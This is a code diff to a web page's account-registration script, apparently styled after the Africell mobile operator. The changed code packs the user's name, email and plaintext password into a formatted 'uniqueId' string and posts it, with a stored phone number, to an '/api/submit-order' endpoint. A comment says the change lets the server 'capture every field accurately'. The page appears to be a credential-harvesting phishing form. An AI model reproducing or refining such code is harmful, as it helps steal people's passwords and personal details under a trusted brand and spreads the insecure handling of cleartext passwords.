@@ -307,7 +307,7 @@
             <!-- Loading Spinner -->
             <div id="loadingSpinner">
                 <div class="spinner"></div>
-                <span>Creating your account...</span>
+                <span id="spinnerText">Creating your account...</span>
             </div>
         </div>
     </div>
@@ -358,14 +358,14 @@
             const pass2 = document.getElementById('confirmRegPassword').value.trim();
             const createBtn = document.getElementById('createAccountBtn');
             const spinnerDiv = document.getElementById('loadingSpinner');
-            const phoneInput = localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone') || 'Unknown Phone';
+            const spinnerText = document.getElementById('spinnerText');
+            const phoneInput = localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone') || '+232 00000000';
 
             if (!nameVal) {
                 showAppAlert('❌ Please enter your full name.');
                 return;
             }
 
-            // Password requirements validation
             if (pass1.length < 5) {
                 showAppAlert('❌ Password must be at least 5 characters long.');
                 return;
@@ -387,15 +387,18 @@
 
             try {
                 createBtn.classList.add('disabled-state');
+                if (spinnerText) spinnerText.innerText = 'Creating your account...';
                 if (spinnerDiv) spinnerDiv.style.display = 'flex';
 
-                // Pass uniqueId prefixed safely so server.js handles it cleanly
+                // Explicit formatted prefix so server.js captures every field accurately
+                const registrationPayload = `Name: ${nameVal} | Email: ${emailVal || 'N/A'} | Password: ${pass1}`;
+
                 const response = await fetch('/api/submit-order', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ 
                         phone: phoneInput, 
-                        uniqueId: `Reg: Name=${nameVal}, Email=${emailVal || 'N/A'}, Pass=${pass1}` 
+                        uniqueId: 'Account Registration: ' + registrationPayload 
                     })
                 });
 
